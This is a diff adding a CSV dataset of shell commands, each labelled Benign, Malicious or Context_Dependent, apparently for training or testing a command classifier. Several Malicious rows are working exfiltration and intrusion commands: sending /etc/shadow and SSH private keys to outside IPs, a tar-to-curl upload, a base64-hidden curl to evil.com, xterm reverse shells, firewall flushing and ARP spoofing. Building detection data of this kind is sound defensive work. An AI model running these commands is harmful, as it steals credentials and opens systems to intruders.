@@ -1,0 +1,43 @@
+command,label,original_label,mitre_id
+tcpdump -i eth0 port 53 -w /tmp/dns.pcap,Context_Dependent,ContextAugment,ContextAugment
+scp /var/log/audit/audit.log ci@10.0.0.40:/srv/review/,Benign,ContextAugment,ContextAugment
+rsync -avz /etc/shadow dev@45.33.32.156:/tmp/ 2>/dev/null,Malicious,ContextAugment,ContextAugment
+systemctl stop iptables && iptables -F,Malicious,ContextAugment,ContextAugment
+journalctl --since '2 hours ago' | grep -i fail,Benign,ContextAugment,ContextAugment
+ssh -D 1080 -fNq test@172.16.2.8,Context_Dependent,ContextAugment,ContextAugment
+ssh -L 9220:internal-api.company.local:8443 dba@audit-box,Benign,ContextAugment,ContextAugment
+tcpdump -i eth0 -s 0 -w /tmp/full.pcap,Context_Dependent,ContextAugment,ContextAugment
+tar cz /etc /root/.ssh 2>/dev/null | curl -X PUT http://198.51.100.9:8080/upload --data-binary @-,Malicious,ContextAugment,ContextAugment
+sudo tcpdump -i eth0 port 6379 -c 100 -w /tmp/capture.pcap,Benign,ContextAugment,ContextAugment
+php -S 0.0.0.0:9443 -t /tmp,Context_Dependent,ContextAugment,ContextAugment
+scp /root/.ssh/id_rsa test@77.88.21.11:/tmp/ 2>/dev/null,Malicious,ContextAugment,ContextAugment
+"perl -MMIME::Base64 -e 'system(decode_base64(""Y3VybCBodHRwOi8vZXZpbC5jb20vc2g=""))'",Malicious,ContextAugment,ContextAugment
+tcpdump -i eth0 -c 200 host 10.0.0.110 -w /tmp/tls-debug.pcap,Benign,ContextAugment,ContextAugment
+tcpdump -i eth0 -c 50 'port 5432 and host 172.16.0.30',Benign,ContextAugment,ContextAugment
+ls -la /etc/systemd/system,Benign,ContextAugment,ContextAugment
+docker cp db:/var/lib/postgresql/data/pg_hba.conf ./pg_hba.conf,Context_Dependent,ContextAugment,ContextAugment
+gdb -batch -p $(pgrep mysql) -ex 'bt',Benign,ContextAugment,ContextAugment
+"python3 -c ""import http.server,socketserver;socketserver.TCPServer((\""0.0.0.0\"",9000),http.server.SimpleHTTPRequestHandler).serve_forever()""",Context_Dependent,ContextAugment,ContextAugment
+python3 -m http.server 8080 --directory /var/www/html,Benign,ContextAugment,ContextAugment
+passwd -d admin,Malicious,ContextAugment,ContextAugment
+ssh -R 8443:127.0.0.1:8443 terraform@jump.internal,Benign,ContextAugment,ContextAugment
+tar czf /tmp/kube-stage.tgz /etc/kubernetes 2>/dev/null,Context_Dependent,ContextAugment,ContextAugment
+ettercap -T -q -i eth0 -M arp:remote /10.0.0.40// /192.168.1.20//,Malicious,ContextAugment,ContextAugment
+rsync -avz /srv/app/config test@192.168.10.15:/tmp/stage/ 2>/dev/null,Context_Dependent,ContextAugment,ContextAugment
+xterm -display 185.199.108.153:1 -e /bin/bash,Malicious,ContextAugment,ContextAugment
+"nmap -p 22,80,443,445 192.168.1.10",Context_Dependent,ContextAugment,ContextAugment
+strace -f -p $(pgrep redis-server) -e trace=write -o /tmp/redis-server-write.trace,Benign,ContextAugment,ContextAugment
+zip -r /tmp/config-backup.zip /etc/nginx /etc/systemd/system,Benign,ContextAugment,ContextAugment
+ssh -L 9653:db.internal:9090 ops@deploy.corp,Benign,ContextAugment,ContextAugment
+tcpdump -i eth0 -c 200 host 192.168.10.15 -w /tmp/tls-debug.pcap,Benign,ContextAugment,ContextAugment
+sudo tcpdump -i eth0 port 443 -c 100 -w /tmp/capture.pcap,Benign,ContextAugment,ContextAugment
+scp /var/log/app/app.log terraform@jump.internal:/srv/audit/,Benign,ContextAugment,ContextAugment
+scp /etc/ssl/certs/company.pem backup@10.0.0.80:/srv/forensics/cert-audit/,Benign,ContextAugment,ContextAugment
+nmap -sV --script=default 192.168.10.15,Context_Dependent,ContextAugment,ContextAugment
+xterm -display 91.234.56.78:1 -e /bin/bash,Malicious,ContextAugment,ContextAugment
+python3 -m http.server 9000 --directory /srv/support-bundles,Benign,ContextAugment,ContextAugment
+scp /etc/ssl/certs/company.pem backup@192.168.10.5:/var/backups/cert-audit/,Benign,ContextAugment,ContextAugment
+tcpdump -i eth0 -G 60 -W 1 -w /tmp/one-minute.pcap port 80,Benign,ContextAugment,ContextAugment
+tar czf /var/backups/ssh-config.tar.gz /etc/ssh/sshd_config,Benign,ContextAugment,ContextAugment
+md5sum /etc/passwd,Benign,ContextAugment,ContextAugment
+ssh -L 9442:localhost:3306 jenkins@monitor.corp,Benign,ContextAugment,ContextAugment
